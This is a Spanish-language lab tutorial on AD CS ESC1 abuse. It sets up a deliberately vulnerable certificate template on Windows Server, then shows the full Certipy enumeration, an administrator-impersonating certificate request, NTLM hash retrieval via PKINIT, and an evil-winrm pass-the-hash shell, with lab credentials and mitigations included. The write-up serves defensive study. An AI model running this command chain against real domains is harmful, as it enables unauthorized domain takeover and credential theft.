# Abuso de AD CS: Explotación de Plantillas ESC1

Guía detallada sobre el abuso de **Active Directory Certificate Services (AD CS)** centrada en el vector **ESC1**: fundamentos teóricos, configuración paso a paso de un laboratorio vulnerable en Windows Server, enumeración y explotación con Certipy desde Linux, y medidas de mitigación.

---

## ¿Qué es AD CS (Active Directory Certificate Services)?

**AD CS** es el rol de Windows Server que convierte un entorno de Active Directory en una **Infraestructura de Clave Pública (PKI)** corporativa. En lugar de adquirir certificados a entidades externas (como DigiCert o Let's Encrypt), la propia organización actúa como su propia Autoridad Certificadora (CA) y emite certificados digitales para sus usuarios, equipos y servicios.

### Usos en Entornos Reales
- **Autenticación**: Inicio de sesión mediante Smart Cards o certificados en equipos clientes sin necesidad de introducir contraseñas.
- **Cifrado de correo (S/MIME)**: Firma y cifrado de mensajes internos.
- **HTTPS interno**: Certificados SSL/TLS para intranets y servicios corporativos.
- **VPN y Wi-Fi empresarial (802.1x)**: Validación de acceso de dispositivos corporativos.
- **Firma de código**: Firma digital de binarios y scripts internos.
- **IPSec**: Cifrado del tráfico entre servidores.

---

### Componentes Clave del Sistema

1. **La Autoridad de Certificación (CA - Certificate Authority)**:  
   Actúa como la entidad de confianza del dominio. Puede ser:
   - **Enterprise CA**: Integrada con Active Directory. Publica plantillas y certificados en el directorio y permite el enrolamiento automático.
   - **Standalone CA**: Independiente de Active Directory, orientada a entornos aislados.
   - Jerárquicamente se divide en **Root CA** (raíz) y **Subordinate / Issuing CAs** (emisoras).

2. **Plantillas de Certificado (Certificate Templates)**:  
   Definen las directivas de emisión de un certificado:
   - Quién tiene permiso para solicitarlo (*Enrollment Rights*).
   - El propósito de uso definido por el **EKU** (*Extended Key Usage*), como *Client Authentication*, *Server Authentication* o *Code Signing*.
   - El período de validez y renovación.
   - Si requiere aprobación manual de un administrador.
   - **Quién define el Subject (identidad) del certificado**.

3. **Proceso de Inscripción (Enrollment)**:  
   El cliente solicita un certificado a la CA basándose en una plantilla. La CA valida los permisos y emite el certificado firmado.

---

### ¿Por qué AD CS es un objetivo crítico en auditorías ofensivas?

Un certificado digital con el EKU de **Client Authentication** es funcionalmente equivalente a conocer la contraseña de una cuenta: permite autenticarse mediante protocolos como **PKINIT** para obtener un Ticket Granting Ticket (TGT) Kerberos o el hash NTLM de dicha cuenta.

Si una plantilla permite que el propio solicitante defina la identidad (*Enrollee Supplies Subject*) y además permite la inscripción a usuarios comunes (`Domain Users` o `Authenticated Users`), un atacante con una cuenta básica puede solicitar un certificado a nombre del **Domain Administrator** y comprometer la totalidad del dominio.

Este vector fue documentado exhaustivamente por SpecterOps en su investigación **"Certified Pre-Owned"** (2021), catalogando los escenarios desde ESC1 hasta ESC8+.

---

## 1. Instalación y Configuración de AD CS en Windows Server

Abrimos el **Server Manager** y hacemos clic en **Add Roles and Features**:

![Server Manager Roles](assets/Pasted%20image%2020260924185941.png)

Avanzamos hasta la sección **Server Roles** y seleccionamos **Active Directory Certificate Services**:

![Seleccionar AD CS](assets/Pasted%20image%2020260924190632.png)

Mantenemos las características requeridas por defecto:

![Características Requeridas](assets/Pasted%20image%2020260924190839.png)

Procedemos con la instalación del rol:

![Instalación del Rol](assets/Pasted%20image%2020260924190927.png)

### Configuración Post-Instalación

Finalizada la instalación, pulsamos en el enlace de notificación **Configure Active Directory Certificate Services**:

![Notificación de Configuración](assets/Pasted%20image%2020260924191158.png)

En **Role Services**, marcamos únicamente **Certification Authority**:

![Role Services CA](assets/Pasted%20image%2020260924191329.png)

En **Setup Type**, seleccionamos **Enterprise CA** para integrarla con Active Directory:

![Enterprise CA](assets/Pasted%20image%2020260924191428.png)

En **CA Type**, seleccionamos **Root CA** (al ser la primera y única entidad certificadora del laboratorio):

![Root CA](assets/Pasted%20image%2020260924191745.png)

En **Private Key**, elegimos **Create a new private key**:

![Create Private Key](assets/Pasted%20image%2020260924191904.png)

Mantenemos las opciones criptográficas predeterminadas y hacemos clic en **Configure**:

![Confirmación Configuración](assets/Pasted%20image%2020260924192308.png)

Verificamos la configuración completada con éxito:

![Configuración Exitosa](assets/Pasted%20image%2020260924192338.png)

---

## 2. Creación de la Plantilla Vulnerable a ESC1

Abrimos la consola de plantillas de certificados ejecutando `certtmpl.msc` (`Win + R`):

![Consola certtmpl.msc](assets/Pasted%20image%2020260924192828.png)

Hacemos clic derecho sobre la plantilla base **User** y seleccionamos **Duplicate Template**:

![Duplicar Plantilla User](assets/Pasted%20image%2020260924193049.png)

En la ventana de propiedades:

![Propiedades de la Plantilla](assets/Pasted%20image%2020260924193147.png)

En la pestaña **General**, asignamos el nombre descriptivo `ESC1-vulnerable`:

![Nombre ESC1-vulnerable](assets/Pasted%20image%2020260924193745.png)

![Plantilla Nombrada](assets/Pasted%20image%2020260924193956.png)

### El Factor Vulnerable: Subject Name

En la pestaña **Subject Name**, marcamos **Supply in the request**.  
Esta es la mala configuración que da origen a ESC1: permite que el cliente solicite el certificado especificando manualmente cualquier identidad en el Subject Alternative Name (SAN):

![Supply in the request](assets/Pasted%20image%2020260924194146.png)

### Permisos de Inscripción (Enrollment)

En la pestaña **Security**, verificamos que grupos como `Authenticated Users` o `Domain Users` dispongan de los permisos **Read** y **Enroll**:

![Permisos de Seguridad](assets/Pasted%20image%2020260924194512.png)

Guardamos los cambios con **Apply** y **OK**.

### Publicación de la Plantilla en la CA

Para que la plantilla esté activa para emisión, abrimos la consola de la CA ejecutando `certsrv.msc`:

![Consola certsrv.msc](assets/Pasted%20image%2020260924195236.png)

Desplegamos el árbol del servidor, hacemos clic derecho en **Certificate Templates** -> **New** -> **Certificate Template to Issue**:

![New Certificate Template to Issue](assets/Pasted%20image%2020260924195647.png)

Seleccionamos la plantilla `ESC1-vulnerable`:

![Seleccionar Plantilla](assets/Pasted%20image%2020260924195724.png)

Verificamos que aparezca publicada y lista para emisión:

![Plantilla Publicada](assets/Pasted%20image%2020260924195751.png)

---

## 3. Enumeración y Explotación desde Linux con Certipy

Configuramos la resolución DNS en `/etc/hosts` de nuestra máquina atacante:

![Configuración /etc/hosts](assets/Pasted%20image%2020260924200046.png)

### Enumeración de Plantillas Vulnerables

Ejecutamos **Certipy** con las credenciales del usuario sin privilegios `jose`:

```bash
certipy find -u 'jose@domain.com' -p '1725j@vik' -dc-ip 192.168.100.50 -vulnerable -stdout
```

![Salida Certipy Find](assets/Pasted%20image%2020260924200318.png)

Certipy identifica de forma automática la vulnerabilidad **ESC1**:

```text
Certificate Authorities
  0
    CA Name                             : domain-SERVIDOR-CA
    DNS Name                            : servidor.domain.com
    Certificate Subject                 : CN=domain-SERVIDOR-CA, DC=domain, DC=com
    Certificate Serial Number           : 6DACF45764E4E7964D5C43E2AD6349FE
    Certificate Validity Start          : 2026-09-24 19:13:16+00:00
    Certificate Validity End            : 2031-09-24 19:23:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : DOMAIN.COM\Administrators
      Access Rights
        ManageCa                        : DOMAIN.COM\Administrators
                                          DOMAIN.COM\Domain Admins
                                          DOMAIN.COM\Enterprise Admins
        ManageCertificates              : DOMAIN.COM\Administrators
                                          DOMAIN.COM\Domain Admins
                                          DOMAIN.COM\Enterprise Admins
        Enroll                          : DOMAIN.COM\Authenticated Users
Certificate Templates
  0
    Template Name                       : ESC1-vulnerable
    Display Name                        : ESC1-vulnerable
    Certificate Authorities             : domain-SERVIDOR-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-09-24T19:39:11+00:00
    Template Last Modified              : 2026-09-24T19:46:03+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DOMAIN.COM\Domain Admins
                                          DOMAIN.COM\Domain Users
                                          DOMAIN.COM\Enterprise Admins
                                          DOMAIN.COM\Authenticated Users
      Object Control Permissions
        Owner                           : DOMAIN.COM\Administrator
        Full Control Principals         : DOMAIN.COM\Domain Admins
                                          DOMAIN.COM\Enterprise Admins
        Write Owner Principals          : DOMAIN.COM\Domain Admins
                                          DOMAIN.COM\Enterprise Admins
        Write Dacl Principals           : DOMAIN.COM\Domain Admins
                                          DOMAIN.COM\Enterprise Admins
        Write Property Enroll           : DOMAIN.COM\Domain Admins
                                          DOMAIN.COM\Domain Users
                                          DOMAIN.COM\Enterprise Admins
    [+] User Enrollable Principals      : DOMAIN.COM\Domain Users
                                          DOMAIN.COM\Authenticated Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

### Solicitud de Certificado Suplantando a Administrator

Utilizando la plantilla `ESC1-vulnerable`, solicitamos un certificado a la CA especificando como UPN a `administrator@domain.com`:

```bash
certipy req -u 'jose@domain.com' -p '1725j@vik' -ca 'domain-SERVIDOR-CA' -template 'ESC1-vulnerable' -upn 'administrator@domain.com' -dc-ip 192.168.100.50
```

![Certificado Emitido para Administrator](assets/Pasted%20image%2020260924200736.png)

La CA emite el certificado digital `administrator.pfx` sin validar si el usuario solicitante tiene autorización para representar a esa identidad.

### Autenticación vía PKINIT y Obtención del Hash NTLM

Utilizamos el archivo `.pfx` para autenticarnos mediante PKINIT contra el Controlador de Dominio:

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.100.50
```

![Autenticación PKINIT y Hash NTLM](assets/Pasted%20image%2020260924200937.png)

El DC valida la firma de la CA de confianza y entrega el hash NTLM del administrador:

```text
5541a93368dc77511bc2725b7b8eb44c
```

### Acceso Total con Pass-the-Hash (Evil-WinRM)

Nos conectamos con `evil-winrm` utilizando el hash obtenido:

```bash
evil-winrm -i 192.168.100.50 -u administrator -H 5541a93368dc77511bc2725b7b8eb44c
```

![Acceso Total Administrator](assets/Pasted%20image%2020260924201256.png)

¡Hemos obtenido privilegios de Administrador de Dominio completos!

---

## Análisis Técnico: ¿Qué Ocurrió?

### ¿Qué es PKINIT?
**PKINIT** (*Public Key Cryptography for Initial Authentication*) es una extensión del protocolo Kerberos que permite el uso de certificados digitales para la obtención de tickets Kerberos (AS-REQ / AS-REP) en lugar de emplear el hash NTLM o contraseña en texto claro.

### La Causa Raíz de ESC1
Al recibir la petición Kerberos, el Controlador de Dominio verifica únicamente:
1. Que el certificado esté firmado por una CA de confianza del bosque.
2. Que el UPN indicado en el certificado exista en el directorio (`administrator@domain.com`).
3. **No verifica** qué cuenta realizó la solicitud inicial a la CA.

La falla reside en la confianza ciega del DC sobre el certificado emitido por la CA con la directiva *Enrollee Supplies Subject*.

---

## Medidas de Mitigación

Para proteger las plantillas de certificado frente a vectores ESC1:

1. **Deshabilitar "Supply in the request"**:  
   En `certtmpl.msc` -> pestaña **Subject Name**, cambiar a **Build from this Active Directory information**. De esta forma, la CA siempre tomará la identidad real del usuario autenticado en Active Directory.

2. **Habilitar Aprobación de Administrador (Manager Approval)**:  
   En la pestaña **Issuance Requirements**, activar **CA certificate manager approval**. Las solicitudes quedarán en estado pendiente hasta ser aprobadas manualmente por un administrador de certificados.

3. **Restringir Permisos de Enroll**:  
   En la pestaña **Security**, eliminar los permisos de inscripción (*Enroll*) para `Authenticated Users` y `Domain Users`. Otorgar permisos únicamente a grupos específicos y autorizados.

4. **Exigir Firmas Autorizadas**:  
   En **Issuance Requirements**, requerir que las solicitudes vengan firmadas previamente por un agente de inscripción autorizado (*Enrollment Agent*).

---

## Recursos Adicionales

* [Video demostrativo de abuso de AD CS](https://www.youtube.com/watch?v=bM8ImAkwlcY&t=3207s)
* [SpecterOps: Certified Pre-Owned Research](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

![Conclusión AD CS](assets/Pasted%20image%2020260924202101.png)
